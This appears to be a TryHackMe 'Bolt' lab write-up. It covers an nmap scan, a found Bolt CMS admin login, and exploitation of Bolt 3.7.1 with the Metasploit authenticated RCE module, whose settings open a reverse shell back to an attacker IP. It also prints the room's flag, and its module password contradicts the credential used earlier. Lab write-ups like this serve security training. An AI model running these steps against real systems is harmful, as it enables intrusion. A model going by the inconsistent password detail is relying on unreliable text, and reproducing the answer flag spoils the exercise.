# TryHackMe Bolt writeup

## nmap

```
nmap -sCV 10.10.254.46
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 23:43 EDT
Nmap scan report for 10.10.254.46
Host is up (0.46s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    (PHP 7.2.32-1)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Bolt | A hero is unleashed
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Sat, 05 Jul 2025 03:43:20 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Sat, 05 Jul 2025 03:43:20 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 1e33e0
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 05 Jul 2025 03:43:19 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Sat, 05 Jul 2025 03:43:19 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: e53b9e
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=7/4%Time=68689F57%P=x86_64-pc-linux-gnu%r(Get
SF:Request,19F9,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2005\x20Jul\x202
SF:025\x2003:43:19\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/
SF:7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20pub
SF:lic,\x20s-maxage=600\r\nDate:\x20Sat,\x2005\x20Jul\x202025\x2003:43:19\
SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Token
SF::\x20e53b9e\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\x20\x
SF:20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"ut
SF:f-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20c
SF:ontent=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\x20A\
SF:x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x20<li
SF:nk\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Roboto:
SF:400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.css\?
SF:8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"styleshee
SF:t\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20\x20\
SF:x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x20\x20
SF:\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/\">\n
SF:\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,1527,"HTTP/1\
SF:.0\x20404\x20Not\x20Found\r\nDate:\x20Sat,\x2005\x20Jul\x202025\x2003:4
SF:3:20\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-1\
SF:+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20mu
SF:st-revalidate\r\nDate:\x20Sat,\x2005\x20Jul\x202025\x2003:43:20\x20GMT\
SF:r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cache\
SF:r\nexpires:\x20-1\r\nX-Debug-Token:\x201e33e0\r\n\r\n<!doctype\x20html>
SF:\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-
SF:scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\.
SF:com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/t
SF:heme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/theme
SF:\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x20
SF:content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class=\"vi
SF:s");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.67 seconds

```

![image](https://github.com/user-attachments/assets/dbe37b31-4ee2-4ca8-b85c-547022353c7d)

passowrd 

```
boltadmin123
```

now we have username and passowrd so we need login page but where is it try to use gobuster but not found 
i search on google about ``bolt login page``:

![image](https://github.com/user-attachments/assets/55bf8812-0384-45a5-901d-daf51a914cb7)

found ``/bolt``

when open it it open login page :

![image](https://github.com/user-attachments/assets/1f1fc579-0a35-42a0-84dd-e1552c92d2a9)

login with 

### **``bolt : boltadmin123``**

![image](https://github.com/user-attachments/assets/7acc37e1-a139-4711-8f3a-343c6509174f)

version is 

```
bolt 3.7.1
```

---

```
searchsploit Bolt 3.7
```

```
48296
```

---

## metasploit

```
msfconsole
```

```
search Bolt 3.7
```

![image](https://github.com/user-attachments/assets/079603af-6a97-4b3d-8dd6-9762774255fd)

```
exploit/unix/webapp/bolt_authenticated_rce
```

```
use 0
```

```
set RHOST 10.10.254.46  <== machine ip
set LHOST 10.8.47.102   <== tun0  ip
set LPORT 4444
set USERNAME bolt
set PASSWORD supersecure
```

```
run
```

![image](https://github.com/user-attachments/assets/531b5a16-392a-493c-b896-2cb97acfa623)

```
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

